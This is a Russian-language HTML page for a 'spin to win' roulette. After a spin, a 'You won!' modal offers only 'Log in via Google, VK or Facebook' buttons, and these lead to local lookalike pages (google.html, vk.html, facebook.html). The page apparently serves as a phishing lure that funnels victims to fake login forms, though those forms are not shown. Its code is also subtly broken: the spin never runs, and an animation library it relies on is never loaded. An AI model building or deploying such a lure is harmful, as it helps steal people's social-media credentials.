<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Рулетка</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background-color: #121212;
      color: #FFF;
    }

    /* Фон сайта */
    .background {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: url('background.jpg') no-repeat center center fixed;
      background-size: cover;
      filter: brightness(0.6);
    }

    .roulette {
      font-family: 'Arial', sans-serif;
      display: block;
      position: absolute;
      width: 400px;
      height: 400px;
      top: 50%;
      left: 50%;
      margin-top: -200px;
      margin-left: -200px;
    }

    .shadow {
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      border-radius: 50%;
      box-shadow: 0 .3em 0 rgba(0, 0, 0, .25) inset;
    }

    .markers {
      display: block;
      position: absolute;
      top: -1px;
      left: -1px;
      right: -1px;
      bottom: -1px;
      overflow: hidden;
      border-radius: 100%;
      .marker {
        position: absolute;
        width: 0;
        height: 0;
        top: -200px;
        left: 200px;
        transform-origin: 0% 400px;
        border: 0 solid transparent;
      }

      .triangle {
        width: 0;
        height: 0;
        border-style: solid;
        border-width: 1em 0 1em 1em;
        border-color: transparent transparent transparent #007bff;
        position: absolute;
        border-left-color: #FFF;
        top: 50%;
        left: -1px;
        margin-top: -1em;
        filter: drop-shadow(0 0.25em 0 rgba(0, 0, 0, 0.25));
      }
    }

    .spinner {
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      border-radius: 50%;
      overflow: hidden;
      transform: rotateZ(0deg);
      backface-visibility: hidden;
    }

    .button {
      width: 10em;
      height: 10em;
      line-height: 10em;
      top: 50%;
      left: 50%;
      margin-left: -5em;
      margin-top: -5em;
      font-weight: 800;
      z-index: 998;
      position: absolute;
      background: #FFF;
      border: none;
      border-radius: 100%;
      color: #999;
      outline: none;
      cursor: pointer;
      user-select: none;
      box-shadow: 0 .4em 0 rgba(0, 0, 0, .25);
      text-align: center;
      transition: transform 0.15s;
      transition-timing-function: cubic-bezier(0.68, -0.55, 0.265, 1.55);
    }

    .button:hover {
      color: inherit;
    }

    .button span {
      font-size: 1.6em;
      letter-spacing: -0.05em;
    }

    .modal {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .modal-content {
      background: white;
      padding: 20px;
      text-align: center;
      border-radius: 10px;
      width: 300px;
    }

    .modal-content h3 {
      margin-bottom: 20px;
    }

    .modal-content button {
      margin: 10px;
      padding: 10px 20px;
      font-size: 1.2em;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="background"></div>

  <div class="roulette">
    <div class="spinner"></div>
    <div class="shadow"></div>
    <div class="markers">
      <div class="triangle"></div>
    </div>
    <div class="button">
      <span>SPIN</span>
    </div>
  </div>

  <div class="modal" id="winModal">
    <div class="modal-content">
      <h3>Вы выиграли!</h3>
      <button onclick="window.location.href='google.html'">Войти через Google</button>
      <button onclick="window.location.href='vk.html'">Войти через VK</button>
      <button onclick="window.location.href='facebook.html'">Войти через Facebook</button>
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    const data = [
      { id: '', color: '#3f297e', text: 'ALL IN', ikon: 'grade' },
      { id: '', color: '#1d61ac', text: '25' },
      { id: '', color: '#169ed8', text: '50' },
      { id: '', color: '#209b6c', text: '100' },
      { id: '', color: '#60b236', text: '200' },
      { id: '', color: '#efe61f', text: '300' },
      { id: '', color: '#f7a416', text: '500' },
      { id: '', color: '#e6471d', text: '+15' },
      { id: '', color: '#dc0936', text: '#@!?' },
      { id: '', color: '#e5177b', text: 'BONUS!' },
      { id: '', color: '#be107f', text: '+100' },
      { id: '', color: '#881f7e', text: 'PLAY AGAIN', ikon: 'replay' }
    ];

    // Проверяем, был ли спин в текущей сессии
    if (!sessionStorage.getItem('hasSpun')) {
      sessionStorage.setItem('hasSpun', 'true');
    }

    class RouletteWheel {
      constructor(el, items) {
        this.$el = $(el);
        this.items = items || [];
        this._angle = 0;
        this._index = 0;
        this.options = { angleOffset: -90 };
      }

      spin(_index) {
        const count = this.items.length;
        const delta = 360 / count;
        const index = !isNaN(parseInt(_index)) ? parseInt(_index) : parseInt(Math.random() * count);
        const angle = index * delta + ((this._bis) ? 1440 : -1440);
        this._bis = !this._bis;
        this._angle = angle;
        this._index = index;

        const $spinner = $(this.$el.find('.spinner'));

        $spinner.velocity('stop').velocity({
          rotateZ: angle + 'deg'
        }, {
          easing: 'easeOutQuint',
          duration: 1000,
          begin: () => this.$el.addClass('busy'),
          complete: () => {
            this.$el.removeClass('busy');
            this.showWinModal();
          }
        });
      }

      render() {
        const $spinner = $(this.$el.find('.spinner'));
        const D = this.$el.width();
        const R = D * 0.5;
        const count = this.items.length;
        const delta = 360 / count;

        this.items.forEach((item, i) => {
          const color = item.color;
          const text = item.text;
          const ikon = item.ikon;

          let html = [];
          html.push('<div class="item" data-index="' + i + '">');
          html.push('<span class="label">');
          if (ikon) html.push('<i class="material-icons">' + ikon + '</i>');
          html.push('<span class="text">' + text + '</span>');
          html.push('</span></div>');

          const $item = $(html.join(''));
          const r = delta * (count - i) + this.options.angleOffset - delta * 0.5;

          $item.css({
            transform: 'rotate(' + r + 'deg)',
            borderTopColor: color
          });

          $spinner.append($item);
        });
      }

      showWinModal() {
        $('#winModal').fadeIn();
      }

      bindEvents() {
        this.$el.find('.button').on('click', () => {
          if (!sessionStorage.getItem('hasSpun')) {
            sessionStorage.setItem('hasSpun', 'true');
            this.spin();
          } else {
            alert("Вы уже крутили рулетку в этой сессии.");
          }
        });
      }
    }

    $(window).ready(function () {
      const spinner = new RouletteWheel($('.roulette'), data);
      spinner.render();
      spinner.bindEvents();
    });
  </script>
</body>
</html>
